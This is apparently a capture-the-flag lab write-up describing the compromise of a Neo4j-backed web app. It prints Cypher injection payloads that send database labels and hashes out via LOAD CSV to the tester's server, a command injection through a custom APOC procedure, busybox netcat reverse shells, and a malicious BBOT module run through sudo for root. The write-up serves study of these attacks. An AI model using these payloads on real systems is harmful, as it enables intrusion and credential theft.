## Initial Reconnaissance
### WhatWeb Results
```
Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], 
IP[10.129.10.93], JQuery[3.6.1], Script, Title[GRAPH ASM], nginx[1.24.0]
```
### Interesting Directories
- `/api/auth`
- `/testing`
## Neo4j Cypher Injection Analysis
### Initial Testing
Upon discovering the application was using Neo4j, I began testing for Cypher injection vulnerabilities. I set up an HTTP web server to receive query results and found that the `username` parameter was injectable, while the `password` parameter was not.
### Enumerating Database Schema
I injected the following query to retrieve all database labels:
```cypher
' OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM 'http://10.10.16.17/?label='+label as l RETURN 0 as _0 //
```
#### Web Server Log Results
```bash
➜  ~ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.10.93 - - [25/Apr/2025 10:18:44] "GET /?label=USER HTTP/1.1" 200 -
10.129.10.93 - - [25/Apr/2025 10:18:46] "GET /?label=HASH HTTP/1.1" 200 -
10.129.10.93 - - [25/Apr/2025 10:18:48] "GET /?label=DNS_NAME HTTP/1.1" 200 -
10.129.10.93 - - [25/Apr/2025 10:18:50] "GET /?label=SHA1 HTTP/1.1" 200 -
10.129.10.93 - - [25/Apr/2025 10:18:54] "GET /?label=SCAN HTTP/1.1" 200 -
10.129.10.93 - - [25/Apr/2025 10:18:55] "GET /?label=ORG_STUB HTTP/1.1" 200 -
10.129.10.93 - - [25/Apr/2025 10:18:58] "GET /?label=IP_ADDRESS HTTP/1.1" 200 -
```
### Extracting User Information
Next, I extracted user and hash information using the following payload:
```cypher
' OR 1=1 WITH 1 as a MATCH (h:SHA1) UNWIND keys(h) as p LOAD CSV FROM 'http://10.10.16.17/?' + p +'='+toString(h[p]) as l RETURN 0 as _0 //
```
#### Response
```bash
10.129.10.93 - - [25/Apr/2025 10:27:45] "GET /?value=graphasm HTTP/1.1" 200 -
10.129.10.93 - - [25/Apr/2025 10:29:40] "GET /?value=9f54ca4c130be6d529a56dee59dc2b2090e43acf HTTP/1.1" 200 -
```
### Understanding the Query Structure
By forcing an error, I was able to understand the original query structure:
```cypher
message: Query cannot conclude with MATCH (must be a RETURN clause, a FINISH clause, an update clause, a unit subquery call, or a procedure call with no YIELD). (line 1, column 1 (offset: 0))
"MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = ''//' return h.value as hash"
```
## Custom APOC Extension Analysis
After standard authentication bypass techniques failed, I investigated further and found a JAR file in the `/testing` directory named `custom-apoc-extension-1.0-SNAPSHOT.jar`. This appeared to be a custom APOC extension for Neo4j.
### Decompiling and Analyzing the JAR
Upon decompiling, I found the `CustomFunctions.java` class which contained a single function called `getUrlStatusCode`:
```java
@Procedure(
name = "custom.getUrlStatusCode",
mode = Mode.READ
)
@Description("Returns the HTTP status code for the given URL as a string"
public Stream<CustomFunctions.StringOutput> getUrlStatusCode(@Name("url") String url) throws Exception {
if (!url.toLowerCase().startsWith("http://") && !url.toLowerCase().startsWith("https://")) {
    url = "https://" + url;
}
```
This function automatically appends `https://` to URLs that don't start with a protocol. However, the critical vulnerability was in the command execution:
```java
String[] command = new String[]{"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url};
```
There was no input sanitization on the `url` parameter, creating a command injection vulnerability.
## Exploiting Command Injection
### Testing Command Execution
I crafted a Cypher query to execute `whoami` and send the result back to my web server:
```cypher
' OR 1=1 WITH 1 as a CALL custom.getUrlStatusCode('; whoami') yield statusCode LOAD CSV FROM 'http://10.10.16.17/?label='+statusCode as l RETURN 0 as _0 //
```
#### Response
```
10.129.231.244 - - [26/Apr/2025 08:31:47] "GET /?label=000neo4j HTTP/1.1" 200 -
```
This confirmed the command injection vulnerability worked, showing the command was run as user `neo4j`.
### Obtaining a Reverse Shell
With command execution confirmed, I created a payload to obtain a reverse shell:
```cypher
' OR 1=1 WITH 1 as a CALL custom.getUrlStatusCode('; busybox nc 10.10.16.17 9001 -e sh') yield statusCode LOAD CSV FROM 'http://10.10.16.17/?label='+statusCode as l RETURN 0 as _0 //
```
I started a listener on port 9001 using `nc -lvnp 9001` and received a connection. I upgraded the shell using Python:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
## Post-Exploitation
### Discovering Credentials
As user `neo4j`, I examined the `.bash_history` file and found database credentials:
```bash
cat /var/lib/neo4j/.bash_history
neo4j-admin dbms set-initial-password cU4btyib.20xtCMCXkBmerhK
```
### Privilege Escalation to User graphasm
I ran LinPEAS to search for additional information and discovered another user named `graphasm`. I tested the previously found password with this user:
```bash
su graphasm
# Password: cU4btyib.20xtCMCXkBmerhK
```
Successfully logged in as `graphasm`, I established an SSH session for better stability.
## Privilege Escalation to Root
### Discovering sudo Permissions
I checked sudo permissions for user `graphasm`:
```bash
sudo -l
```
#### Output
```
Matching Defaults entries for graphasm on cypher:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty
User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
```
This showed that I could run the `bbot` binary as root without a password.
### Researching BBOT
Research revealed that BBOT is a modular OSINT tool that allows loading custom modules. The documentation provided a sample module structure that I could leverage for privilege escalation.
### Creating a Malicious Module
I created a file called `evilmod.py` in the home directory with the following content:
```python
from bbot.modules.base import BaseModule
import os
class evilmod(BaseModule):
    watched_events = ["DNS_NAME"]
    produced_events = ["WHOIS"]
    flags = ["passive", "safe"]
    meta = {"description": "Malicious module for privilege escalation"}
    async def setup(self):
        os.system("busybox nc 10.10.16.17 4444 -e sh")
    async def handle_event(self, event):
        pass
```
### Modifying the Preset File
I modified the existing preset file to include my custom module directory:
```yaml
targets:
  - ecorp.htb
output_dir: /home/graphasm/bbot_scans
module_dirs:
  - /home/graphasm
config:
  modules:
    evil:
    neo4j:
      username: neo4j
      password: cU4btyib.20xtCMCXkBmerhK
```
### Executing the Exploit
I set up a listener on port 4444 and executed the BBOT binary with my preset:
```bash
sudo /usr/local/bin/bbot -t http://10.10.16.17/ -p /home/graphasm/bbot_preset.yml -m evilmod
```
The malicious module executed during setup, and I received a reverse shell with root privileges.

